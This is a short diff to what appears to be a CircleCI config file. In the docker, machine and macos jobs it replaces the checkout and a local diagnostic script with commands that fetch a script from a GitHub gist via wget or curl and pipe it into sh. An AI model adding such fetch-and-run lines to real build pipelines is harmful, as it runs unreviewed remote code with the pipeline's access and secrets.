@@ -4,19 +4,16 @@ jobs:
     docker:
       - image: ruby:2.5
     steps:
-      - checkout
-      - run: ./circleci-diag.sh
+      - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
   machine:
     machine: true
     steps:
-      - checkout
-      - run: ./circleci-diag.sh
+      - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
   macos:
     macos:
       xcode: "9.0"
     steps:
-      - checkout
-      - run: ./circleci-diag.sh
+      - run: curl -s https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev | sh
 workflows:
   version: 2
   build_and_test:
